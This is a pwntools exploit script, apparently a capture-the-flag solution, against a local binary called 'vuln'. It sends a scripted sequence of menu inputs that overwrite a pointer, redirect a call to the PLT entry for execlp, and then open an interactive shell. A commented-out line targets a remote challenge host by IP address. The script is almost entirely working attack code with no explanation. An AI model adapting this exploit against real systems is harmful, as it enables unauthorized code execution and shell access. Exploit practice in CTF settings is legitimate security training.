#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+270
b *main+214
b *main+328
b *main+423
b *main+509
b *main+534
b *main+359
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

io = start(env={"LD_PRELOAD":"./libc.so.6 "})
#io = remote('35.246.158.241', 31269)

io.sendline(b'1')

io.sendline(b'6')

io.sendline(b'2')
io.sendline(b'A'*0x10)

io.sendline(b'7')

io.sendline(b'4')
io.sendline(b'A'*8 + p64(0x40084a))

io.sendline(b'1')

io.sendline(b'4')
io.sendline(p64(0xdeadbeef)+p64(exe.plt['execlp']))

#io.sendline(b'%d')
io.sendline(b'7')
io.sendline(b'7')
io.sendline(b'5')

#for _ in range(8):
#    io.sendline(b'2')
#    io.sendline(b'A'*0x10)

#for _ in range(6):
#    io.sendline(b'7')

io.interactive()
